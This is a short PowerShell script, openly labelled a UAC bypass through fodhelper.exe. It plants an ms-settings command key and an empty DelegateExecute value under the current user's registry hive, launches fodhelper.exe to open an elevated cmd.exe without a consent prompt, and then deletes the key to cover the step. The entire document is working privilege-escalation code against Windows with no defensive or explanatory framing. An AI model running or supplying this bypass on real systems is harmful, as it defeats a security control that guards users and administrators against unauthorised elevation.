# PowerShell UAC bypass via fodhelper.exe (Method 33)

$regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
$payload = "C:\Windows\System32\cmd.exe"

Write-Host "[*] Creating registry keys for UAC bypass..."

# Create registry path and set payload
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name "(Default)" -Value $payload -Force
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -PropertyType String -Force | Out-Null

Write-Host "[+] Registry keys created. Launching fodhelper.exe..."
Start-Process "C:\Windows\System32\fodhelper.exe"

Start-Sleep -Seconds 3

Write-Host "[*] Cleaning up..."
Remove-Item -Path $regPath -Recurse -Force

Write-Host "[+] Done. If successful, an elevated cmd.exe should now be open."
